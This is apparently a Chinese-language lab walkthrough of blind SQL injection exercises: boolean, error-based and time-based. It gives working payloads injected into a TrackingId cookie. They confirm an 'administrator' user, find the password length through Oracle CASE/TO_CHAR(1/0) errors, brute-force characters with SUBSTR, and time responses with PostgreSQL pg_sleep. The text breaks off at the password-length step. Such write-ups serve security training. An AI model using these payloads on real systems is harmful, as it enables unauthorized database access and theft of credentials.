带有条件响应的盲注

这里是sql盲注，如果查到数据，会回显welcome。

TrackingId=KJrS7xv71YWYlijW'+and+(SELECT+'a'+FROM+users+where+username='administrator')='a'--;

跳过前面的步骤，直接通过and来进行条件判断。上面的请求包回显了welcome，说明存在一个值为administrator的username。

下面先判断password的长度，大于19为true，大于20为false，因此password长度为20.

带有条件错误的盲注

这一关是基于报错的盲注。一个单引号报错，两个正常回显，说明闭合了：

用简单的select语句判断出数据库之后，直接修改payload进行密码长度猜解：

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

SELECT CASE WHEN (length(password)>1) THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator'

大于19时，报错，大于20时，正常回显，说明length=20：

确定长度后，利用SUBSTR函数依次爆破密码即可，与前面类似SUBSTR(password,1,1)='a'。

这一关要求以administrator登录，同样省去前面重复的步骤，验证一下语句正确性：

判断存在administrator：

'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

判断密码长度：
